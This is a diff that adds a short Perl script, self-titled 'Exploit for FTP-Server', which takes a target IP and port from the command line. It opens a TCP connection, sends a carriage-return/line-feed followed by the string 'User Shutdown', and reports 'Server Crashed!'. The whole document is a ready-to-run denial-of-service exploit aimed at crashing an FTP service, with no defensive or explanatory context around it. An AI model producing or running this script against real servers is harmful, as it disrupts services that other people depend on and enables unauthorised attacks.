@@ -1,0 +1,21 @@
+  print "Exploit for FTP-Server\n";
+  print "   by The real Remoter\n";
+  my $usage = "\nftpcrash <IP> <Port>\n";
+  die "$usage" unless $ARGV[0] && $ARGV[1];
+  use Socket;
+  my $remote = $ARGV[0];
+  my $port = $ARGV[1];
+  my $iaddr = inet_aton($remote);
+  my $proto = getprotobyname("tcp");
+  my $paddr = sockaddr_in($port, $iaddr);
+  socket(SOCK, PF_INET, SOCK_STREAM, $proto);
+  connect(SOCK, $paddr) or die "Can't connect to " . $remote;
+  print "Sending exploit\n";
+  $msg = "\x0d\x0a";
+  $msg = $msg . "User Shutdown";
+  send(SOCK,$msg, 0) or die "Can't send Exploit";
+  sleep(1);
+  print "Server Crashed!";
+  sleep(1);
+  exit;
+
